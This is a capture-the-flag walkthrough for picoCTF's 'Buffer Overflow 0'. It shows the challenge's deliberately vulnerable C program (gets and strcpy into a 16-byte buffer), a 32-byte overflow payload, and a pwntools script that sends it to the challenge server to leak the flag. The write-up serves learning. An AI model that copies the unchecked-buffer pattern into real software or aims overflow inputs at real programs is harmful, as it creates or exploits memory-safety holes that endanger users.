
# Exploiting Buffer Overflow 0 Step-by-Step | picoCTF Walkthrough


## Challenge Overview

**Challenge Name**: Buffer Overflow 0
**Category**: Binary Exploitation
**What We Get:**
A compiled binary (`vuln`)
The source code (`vuln.c`)


![Image description](https://github.com/shalintha/CTF-writeups/blob/master/assets/buffer-overflow-0.png?raw=true)

## Understanding the Challenge
The challenge gives us a binary file (`vuln`) and its source code (`vuln.c`). The goal is to exploit a buffer overflow vulnerability to change a variable's value and make the program reveal the flag. Sounds fun, right? Let's get started!

## Understanding the Code
First, let's take a look at the source code to see what we're dealing with:

```c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}

```

## What’s Happening Here?

**1. Buffer Overflow Vulnerability:**
The vuln function has a buffer (`buf2`) that’s only 16 bytes long. The program uses `strcpy` to copy user input into this buffer, but it doesn’t check the length of the input. This means if we give it more than 16 bytes, we can overwrite other parts of memory!

**2. Signal Handler:**
If a segmentation fault occurs (e.g., due to a buffer overflow), the `sigsegv_handler` function is triggered, which prints the flag.

**3. User Input:**
The main function reads user input using `gets`, which is notoriously unsafe because it doesn’t limit the amount of input. This input is then passed to the `vuln` function.

**4. Key Takeaways:**
The program reads the flag from `flag.txt` and stores it in a global variable flag.
The `gets(buf1)`; function is used, which is dangerous because it doesn’t check input length.
The function `vuln()` uses `strcpy(buf2, input);`, which can lead to buffer overflow since `buf2` is only 16 bytes long.
If we trigger a segmentation fault `(SIGSEGV)`, the handler will print the flag!

## Exploitation Plan
To solve this challenge, we need to:

1. **Overflow the Buffer:** Send more than 16 bytes of input to cause a buffer overflow.

2. **Trigger a Segmentation Fault:** The overflow will cause the program to crash, triggering the `sigsegv_handler` and printing the flag.

We can use the given binary and provide an oversized input to trigger a segmentation fault and leak the flag:

```python
python3 -c 'print("A" * 32)' | ./vuln
```

Or we can use the given remote server as below as well.

## Step 1: Creating the Payload
We need to send an input that:

- Fills the 16-byte buffer in the `vuln` function.

- Overflows the buffer to cause a segmentation fault.

In Python, we can create this payload like this:

```python
payload = b"A" * 32  # More than enough to overflow the buffer
```

## Here’s what’s happening:

`b"A" * 32:` Sends 32 bytes of the letter `A`. This is way more than the 16 bytes the buffer can hold, so it will overflow and cause a crash.

## Step 2: Send the Payload
We’ll use a Python script to send our payload to the remote server. Here’s the script:

```python
from pwn import *

# Connect to the challenge server
conn = remote('saturn.picoctf.net', 51086)

# Creating the payload
payload = b"A" * 32

# Send the payload
conn.sendline(payload)

# Receive the flag
print(conn.recvall().decode())

```

## What’s This Script Doing?

1. Connecting to the Server:
The `remote` function connects to the challenge `server at saturn.picoctf.net` on port `51086`.

2. Sending the Payload:
The `sendline` function sends our crafted payload to the server.

3. Receiving the Flag:
The `recvall` function grabs the server’s response, which should include the flag.

## Step 3: Run the Script

Save the script as `exploit.py` and run it:

```python
python3 exploit.py
```

If everything works correctly, you’ll see the flag printed on your screen! 🎉

## What Happened?
When we send more than 16 bytes of input, the extra data overflows the `buf2` buffer and corrupts the program’s memory. This causes a segmentation fault, which triggers the `sigsegv_handler` function. The handler then prints the flag for us.

## Final Thoughts
This challenge is a great way to learn about buffer overflows and how they can be exploited to manipulate a program’s behavior. By causing a crash, we can trigger a signal handler that reveals the flag. Once you understand the basics, you can tackle more advanced challenges!

Flag: `picoCTF{...}` (You’ll see the actual flag when you run the exploit!)

Happy hacking! 😄 If you have any questions or run into issues, feel free to ask. Good luck with the rest of picoCTF! 🚀






